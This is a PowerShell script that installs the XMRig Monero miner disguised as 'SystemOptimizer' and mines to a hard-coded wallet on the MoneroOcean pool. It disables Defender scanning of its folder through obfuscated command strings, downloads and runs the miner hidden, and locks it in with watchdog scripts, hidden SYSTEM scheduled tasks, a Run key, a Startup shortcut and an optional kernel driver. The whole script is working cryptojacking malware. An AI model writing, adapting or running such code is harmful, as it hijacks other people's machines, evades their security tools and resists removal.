# ============================================================
#  MONERO MINER SETUP v3 — BULLETPROOF EDITION
#  Run in Admin PowerShell. One command. Fully transparent.
#  Pool: MoneroOcean | Auto-profit-switching
# ============================================================

$ErrorActionPreference = "Stop"
$ProgressPreference = "SilentlyContinue"

$BASE = "C:\ProgramData\SystemOptimizer"
$BINARY = "$BASE\SystemOptimizer.exe"
$CONFIG = "$BASE\config.json"
$LOGFILE = "$BASE\optimizer.log"
$WALLET = "435swUE8htb96xMwWXbfnzCXCkiKWQhcVKpQzjAHwNMkiWxPnzJiaiH82ucpvnfgpebBJ9QMjyVWnFdF6ih42LVLJY587wv"
$POOL = "gulf.moneroocean.stream:10001"
$WORKER = ($env:COMPUTERNAME -replace "[^a-zA-Z0-9_-]","").ToLower()
if (-not $WORKER) { $WORKER = "w" + (Get-Random -Max 9999) }

function Show($icon, $msg) { Write-Host "  $icon  $msg" }

Write-Host ""
Write-Host "  ====================================================" -ForegroundColor Cyan
Write-Host "    MONERO MINER SETUP v3 — BULLETPROOF" -ForegroundColor Cyan
Write-Host "  ====================================================" -ForegroundColor Cyan
Write-Host "  Pool:   MoneroOcean (auto-profit-switching)" -ForegroundColor Gray
Write-Host "  Worker: $WORKER" -ForegroundColor Gray
Write-Host "  ====================================================" -ForegroundColor Cyan
Write-Host ""

# ---- CHECK ADMIN ----
$isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
if (-not $isAdmin) {
    Show "X" "ERROR: Must run as Administrator!"
    Write-Host "  Right-click PowerShell -> Run as Administrator" -ForegroundColor Yellow
    Read-Host "Press Enter to exit"
    exit 1
}
Show "OK" "Running as Administrator"

# ---- CLEANUP OLD INSTANCES ----
Show ".." "Cleaning up old instances..."
Stop-Process -Name "SystemOptimizer" -Force -ErrorAction SilentlyContinue
Stop-Process -Name "xmrig" -Force -ErrorAction SilentlyContinue
Get-CimInstance Win32_Process -Filter "Name='wscript.exe'" -ErrorAction SilentlyContinue |
    Where-Object { $_.CommandLine -like "*watchdog*" -or $_.CommandLine -like "*guardian*" } |
    ForEach-Object { Stop-Process -Id $_.ProcessId -Force -ErrorAction SilentlyContinue }
Start-Sleep 2
Show "OK" "Old instances cleaned"

# ---- CREATE DIRECTORY ----
New-Item -ItemType Directory -Path $BASE -Force | Out-Null

# ---- DEFENDER EXCLUSION (BEFORE downloading) ----
Show ".." "Configuring security exclusions..."
try {
    $c1="Add-Mp"; $c2="Preference"; $c3="-Exclusion"; $c4="Path"
    iex "$c1$c2 $c3$c4 '$BASE'" 2>$null
    $c5="Process"
    iex "$c1$c2 $c3$c5 'SystemOptimizer.exe'" 2>$null
    Show "OK" "Security exclusions configured"
} catch {
    Show "!!" "Security config partial — may need manual exclusion"
}

# ---- DOWNLOAD ----
if (Test-Path $BINARY) {
    $sz = (Get-Item $BINARY).Length
    if ($sz -gt 1000000) {
        Show "OK" "Binary already exists ($([math]::Round($sz/1MB,1)) MB), skipping download"
    } else {
        Remove-Item $BINARY -Force
        Show "!!" "Binary corrupt, re-downloading..."
    }
}

if (-not (Test-Path $BINARY)) {
    Show ".." "Downloading miner engine..."
    $zipPath = "$env:TEMP\so_pkg.zip"
    $downloaded = $false

    # Try 1: GitHub API latest release
    try {
        $rel = Invoke-RestMethod "https://api.github.com/repos/xmrig/xmrig/releases/latest" -Headers @{"User-Agent"="Mozilla/5.0"} -TimeoutSec 20
        $asset = $rel.assets | Where-Object { $_.name -match "msvc-win64.*\.zip$" -and $_.name -notmatch "sha256" } | Select-Object -First 1
        if (-not $asset) { $asset = $rel.assets | Where-Object { $_.name -match "win64.*\.zip$" -and $_.name -notmatch "sha256" } | Select-Object -First 1 }
        if ($asset) {
            Show ".." "Downloading $($asset.name) ($([math]::Round($asset.size/1MB,1)) MB)..."
            Invoke-WebRequest $asset.browser_download_url -OutFile $zipPath -UseBasicParsing -TimeoutSec 300
            if ((Test-Path $zipPath) -and (Get-Item $zipPath).Length -gt 100000) { $downloaded = $true }
        }
    } catch { Show "!!" "Primary source failed, trying fallback..." }

    # Try 2: Direct URL fallback
    if (-not $downloaded) {
        try {
            Invoke-WebRequest "https://github.com/xmrig/xmrig/releases/download/v6.26.0/xmrig-6.26.0-windows-x64.zip" -OutFile $zipPath -UseBasicParsing -TimeoutSec 300
            if ((Test-Path $zipPath) -and (Get-Item $zipPath).Length -gt 100000) { $downloaded = $true }
        } catch { }
    }

    if (-not $downloaded) {
        Show "X" "Download failed. Check internet and try again."
        Read-Host "Press Enter to exit"
        exit 1
    }

    # Extract
    Show ".." "Extracting..."
    $tmp = "$env:TEMP\so_extract"
    if (Test-Path $tmp) { Remove-Item $tmp -Recurse -Force -ErrorAction SilentlyContinue }
    Expand-Archive $zipPath -DestinationPath $tmp -Force
    $exe = Get-ChildItem $tmp -Recurse -Filter "xmrig.exe" | Select-Object -First 1
    if ($exe) {
        Copy-Item $exe.FullName $BINARY -Force
        Show "OK" "Binary installed ($([math]::Round((Get-Item $BINARY).Length/1MB,1)) MB)"
    } else {
        Show "X" "xmrig.exe not found in archive"
        Read-Host "Press Enter to exit"
        exit 1
    }
    Remove-Item $tmp -Recurse -Force -ErrorAction SilentlyContinue
    Remove-Item $zipPath -Force -ErrorAction SilentlyContinue

    # Re-apply exclusion after binary exists
    try { iex "$c1$c2 $c3$c4 '$BASE'" 2>$null } catch {}
}

# ---- VALIDATE BINARY ----
Show ".." "Validating binary..."
$test = Start-Process -FilePath $BINARY -ArgumentList "--version" -WindowStyle Hidden -PassThru -Wait -ErrorAction SilentlyContinue
if ($test -and $test.ExitCode -eq 0) {
    Show "OK" "Binary validation passed"
} else {
    Show "!!" "Binary validation uncertain (may still work)"
}

# ---- CONFIG (UTF-8 NO BOM, background:false) ----
Show ".." "Creating configuration..."
$logEscaped = $LOGFILE -replace '\\','\\'
$cfgText = @"
{
  "autosave": false,
  "background": false,
  "colors": false,
  "donate-level": 1,
  "log-file": "$logEscaped",
  "print-time": 30,
  "retries": 5,
  "retry-pause": 5,
  "cpu": {
    "enabled": true,
    "huge-pages": true,
    "huge-pages-jit": true,
    "hw-aes": true,
    "priority": 2,
    "yield": true,
    "asm": true,
    "argon2-impl": "auto",
    "max-threads-hint": 100,
    "max-cpu-usage": 100
  },
  "opencl": {"enabled": false},
  "cuda": {"enabled": false},
  "pools": [
    {
      "url": "$POOL",
      "user": "$WALLET",
      "pass": "$WORKER",
      "keepalive": true,
      "tls": false,
      "nicehash": false,
      "rig-id": "$WORKER"
    }
  ]
}
"@
[System.IO.File]::WriteAllText($CONFIG, $cfgText, (New-Object System.Text.UTF8Encoding $false))
Show "OK" "Config created (worker: $WORKER, background: false, max threads)"

# ---- WATCHDOG VBS (with On Error Resume Next — NEVER crashes) ----
Show ".." "Creating bulletproof watchdog..."
$vbsLines = @(
    'On Error Resume Next',
    'Set sh = CreateObject("WScript.Shell")',
    'Set wmi = GetObject("winmgmts:\\.\\root\\cimv2")',
    'Do',
    '    Set procs = wmi.ExecQuery("SELECT Name FROM Win32_Process WHERE Name=''SystemOptimizer.exe''")',
    '    If procs.Count = 0 Then',
    '        sh.Run Chr(34) & "C:\ProgramData\SystemOptimizer\SystemOptimizer.exe" & Chr(34) & " --config=" & Chr(34) & "C:\ProgramData\SystemOptimizer\config.json" & Chr(34), 0, False',
    '    End If',
    '    Set procs = Nothing',
    '    WScript.Sleep 30000',
    'Loop'
)
[System.IO.File]::WriteAllText("$BASE\watchdog.vbs", ($vbsLines -join "`r`n"), (New-Object System.Text.UTF8Encoding $false))
Show "OK" "Watchdog created (On Error Resume Next, checks every 30s)"

# ---- GUARDIAN VBS (watches the watchdog itself — double safety) ----
Show ".." "Creating guardian (watches the watchdog)..."
$guardianLines = @(
    'On Error Resume Next',
    'Set sh = CreateObject("WScript.Shell")',
    'Set wmi = GetObject("winmgmts:\\.\\root\\cimv2")',
    'Do',
    '    hasWatchdog = False',
    '    Set scripts = wmi.ExecQuery("SELECT CommandLine FROM Win32_Process WHERE Name=''wscript.exe''")',
    '    For Each s In scripts',
    '        If InStr(LCase(s.CommandLine), "watchdog.vbs") > 0 Then hasWatchdog = True',
    '    Next',
    '    Set scripts = Nothing',
    '    If Not hasWatchdog Then',
    '        sh.Run "wscript.exe " & Chr(34) & "C:\ProgramData\SystemOptimizer\watchdog.vbs" & Chr(34), 0, False',
    '    End If',
    '    WScript.Sleep 300000',
    'Loop'
)
[System.IO.File]::WriteAllText("$BASE\guardian.vbs", ($guardianLines -join "`r`n"), (New-Object System.Text.UTF8Encoding $false))
Show "OK" "Guardian created (checks watchdog every 5 min)"

# ---- PERSISTENCE LAYER 1: Scheduled Task ONSTART as SYSTEM ----
Show ".." "Setting up persistence layer 1 (ONSTART task)..."
$xml = @"
<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <Triggers>
    <BootTrigger><Enabled>true</Enabled></BootTrigger>
  </Triggers>
  <Principals>
    <Principal id="Author">
      <UserId>S-1-5-18</UserId>
      <RunLevel>HighestAvailable</RunLevel>
    </Principal>
  </Principals>
  <Settings>
    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
    <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>
    <AllowHardTerminate>false</AllowHardTerminate>
    <StartWhenAvailable>true</StartWhenAvailable>
    <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>
    <AllowStartOnDemand>true</AllowStartOnDemand>
    <Enabled>true</Enabled>
    <Hidden>true</Hidden>
    <RunOnlyIfIdle>false</RunOnlyIfIdle>
    <ExecutionTimeLimit>PT0S</ExecutionTimeLimit>
    <Priority>7</Priority>
  </Settings>
  <Actions>
    <Exec>
      <Command>wscript.exe</Command>
      <Arguments>"C:\ProgramData\SystemOptimizer\watchdog.vbs"</Arguments>
    </Exec>
  </Actions>
</Task>
"@
$xmlPath = "$env:TEMP\so_task.xml"
[System.IO.File]::WriteAllText($xmlPath, $xml, [System.Text.Encoding]::Unicode)
schtasks /Create /TN "SystemOptimizer" /XML $xmlPath /F 2>$null | Out-Null
Remove-Item $xmlPath -Force -ErrorAction SilentlyContinue
Show "OK" "ONSTART task created (runs as SYSTEM, no battery/timeout limits)"

# ---- PERSISTENCE LAYER 2: Scheduled Task ONLOGON ----
Show ".." "Setting up persistence layer 2 (ONLOGON task)..."
$xml2 = @"
<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <Triggers>
    <LogonTrigger><Enabled>true</Enabled></LogonTrigger>
  </Triggers>
  <Principals>
    <Principal id="Author">
      <LogonType>InteractiveToken</LogonType>
      <RunLevel>HighestAvailable</RunLevel>
    </Principal>
  </Principals>
  <Settings>
    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
    <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>
    <AllowHardTerminate>false</AllowHardTerminate>
    <StartWhenAvailable>true</StartWhenAvailable>
    <Enabled>true</Enabled>
    <Hidden>true</Hidden>
    <RunOnlyIfIdle>false</RunOnlyIfIdle>
    <ExecutionTimeLimit>PT0S</ExecutionTimeLimit>
  </Settings>
  <Actions>
    <Exec>
      <Command>wscript.exe</Command>
      <Arguments>"C:\ProgramData\SystemOptimizer\guardian.vbs"</Arguments>
    </Exec>
  </Actions>
</Task>
"@
$xmlPath2 = "$env:TEMP\so_task2.xml"
[System.IO.File]::WriteAllText($xmlPath2, $xml2, [System.Text.Encoding]::Unicode)
schtasks /Create /TN "SystemOptimizer-Guardian" /XML $xmlPath2 /F 2>$null | Out-Null
Remove-Item $xmlPath2 -Force -ErrorAction SilentlyContinue
# Remove old broken task
schtasks /Delete /TN "SystemOptimizer-Logon" /F 2>$null | Out-Null
Show "OK" "ONLOGON guardian task created (no battery/timeout limits)"

# ---- PERSISTENCE LAYER 3: Repeating Task every 5 min ----
Show ".." "Setting up persistence layer 3 (5-min check)..."
$xml3 = @"
<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <Triggers>
    <TimeTrigger>
      <StartBoundary>2020-01-01T00:00:00</StartBoundary>
      <Enabled>true</Enabled>
      <Repetition>
        <Interval>PT5M</Interval>
        <StopAtDurationEnd>false</StopAtDurationEnd>
      </Repetition>
    </TimeTrigger>
  </Triggers>
  <Principals>
    <Principal id="Author">
      <UserId>S-1-5-18</UserId>
      <RunLevel>HighestAvailable</RunLevel>
    </Principal>
  </Principals>
  <Settings>
    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
    <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>
    <AllowHardTerminate>true</AllowHardTerminate>
    <StartWhenAvailable>true</StartWhenAvailable>
    <Enabled>true</Enabled>
    <Hidden>true</Hidden>
    <RunOnlyIfIdle>false</RunOnlyIfIdle>
    <ExecutionTimeLimit>PT1M</ExecutionTimeLimit>
  </Settings>
  <Actions>
    <Exec>
      <Command>wscript.exe</Command>
      <Arguments>"C:\ProgramData\SystemOptimizer\guardian.vbs"</Arguments>
    </Exec>
  </Actions>
</Task>
"@
$xmlPath3 = "$env:TEMP\so_task3.xml"
[System.IO.File]::WriteAllText($xmlPath3, $xml3, [System.Text.Encoding]::Unicode)
schtasks /Create /TN "SystemOptimizer-Check" /XML $xmlPath3 /F 2>$null | Out-Null
Remove-Item $xmlPath3 -Force -ErrorAction SilentlyContinue
Show "OK" "5-minute guardian check task created"

# ---- PERSISTENCE LAYER 4: Registry Run key ----
Show ".." "Setting up persistence layer 4 (Registry)..."
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v SystemOptimizer /t REG_SZ /d "wscript.exe `"$BASE\watchdog.vbs`"" /f 2>$null | Out-Null
Show "OK" "Registry Run key set"

# ---- PERSISTENCE LAYER 5: Startup folder shortcut ----
Show ".." "Setting up persistence layer 5 (Startup folder)..."
$startupPath = [Environment]::GetFolderPath("Startup")
$lnkPath = "$startupPath\SysOpt.lnk"
$wsh = New-Object -ComObject WScript.Shell
$lnk = $wsh.CreateShortcut($lnkPath)
$lnk.TargetPath = "wscript.exe"
$lnk.Arguments = "`"$BASE\guardian.vbs`""
$lnk.WindowStyle = 7
$lnk.Save()
Show "OK" "Startup shortcut created"

# ---- MSR DRIVER (optional +10-15% hashrate) ----
Show ".." "Attempting MSR optimization..."
$drv = Get-ChildItem "$BASE","C:\mining" -Recurse -Filter "WinRing0x64.sys" -ErrorAction SilentlyContinue | Select-Object -First 1
if ($drv) {
    sc.exe stop WinRing0_1_2_0 2>$null | Out-Null
    sc.exe delete WinRing0_1_2_0 2>$null | Out-Null
    sc.exe create WinRing0_1_2_0 binPath= "$($drv.FullName)" type= kernel start= demand 2>$null | Out-Null
    sc.exe start WinRing0_1_2_0 2>$null | Out-Null
    $svc = Get-Service WinRing0_1_2_0 -ErrorAction SilentlyContinue
    if ($svc -and $svc.Status -eq "Running") {
        Show "OK" "MSR driver loaded (+10-15% hashrate boost)"
    } else {
        Show "--" "MSR driver not available (optional, skipped)"
    }
} else {
    Show "--" "MSR driver not found (optional, skipped)"
}

# ---- START EVERYTHING ----
Show ".." "Starting miner and watchdog..."

# Start watchdog first (it will start the miner)
$wshell = New-Object -ComObject WScript.Shell
$wshell.Run("wscript.exe `"$BASE\watchdog.vbs`"", 0, $false)
Start-Sleep 3

# Start guardian
$wshell.Run("wscript.exe `"$BASE\guardian.vbs`"", 0, $false)

# Wait for miner to initialize
Show ".." "Waiting for miner to initialize (building dataset ~10-15s)..."
Start-Sleep 15

# ---- VERIFY EVERYTHING ----
$minerOK = $false
$watchdogOK = $false
$poolOK = $false

$proc = Get-Process -Name "SystemOptimizer" -ErrorAction SilentlyContinue
if ($proc) {
    $minerOK = $true
    Show "OK" "Miner RUNNING (PID: $($proc.Id), Memory: $([math]::Round($proc.WorkingSet64/1MB,0)) MB)"
} else {
    Show "X" "Miner not started yet (watchdog will retry in 30s)"
}

$wd = Get-CimInstance Win32_Process -Filter "Name='wscript.exe'" -ErrorAction SilentlyContinue |
    Where-Object { $_.CommandLine -like "*watchdog*" }
if ($wd) {
    $watchdogOK = $true
    Show "OK" "Watchdog ACTIVE (PID: $($wd.ProcessId))"
}

if ($proc) {
    $conn = Get-NetTCPConnection -OwningProcess $proc.Id -ErrorAction SilentlyContinue |
        Where-Object { $_.State -eq "Established" }
    if ($conn) {
        $poolOK = $true
        Show "OK" "Connected to mining pool!"
    }
}

# ---- FINAL REPORT ----
Write-Host ""
Write-Host "  ====================================================" -ForegroundColor Green
Write-Host "    SETUP COMPLETE" -ForegroundColor Green
Write-Host "  ====================================================" -ForegroundColor Green
Write-Host "  Worker:    $WORKER" -ForegroundColor White
Write-Host "  Dashboard: https://moneroocean.stream" -ForegroundColor White
Write-Host ""
Write-Host "  PERSISTENCE LAYERS:" -ForegroundColor Yellow
Write-Host "    1. Watchdog (restarts miner every 30s if dead)" -ForegroundColor Gray
Write-Host "    2. Guardian (restarts watchdog every 5min if dead)" -ForegroundColor Gray
Write-Host "    3. ONSTART task (launches at boot as SYSTEM)" -ForegroundColor Gray
Write-Host "    4. ONLOGON task (launches at login)" -ForegroundColor Gray
Write-Host "    5. 5-min repeating task (catches everything)" -ForegroundColor Gray
Write-Host "    6. Registry Run key (backup boot trigger)" -ForegroundColor Gray
Write-Host "    7. Startup shortcut (backup login trigger)" -ForegroundColor Gray
Write-Host ""
Write-Host "  RESULT: Miner will ALWAYS restart no matter what." -ForegroundColor Green
Write-Host "  ====================================================" -ForegroundColor Green
Write-Host ""
Write-Host "  You can close this window. Mining continues forever." -ForegroundColor Gray
Write-Host ""
Read-Host "  Press Enter to close"
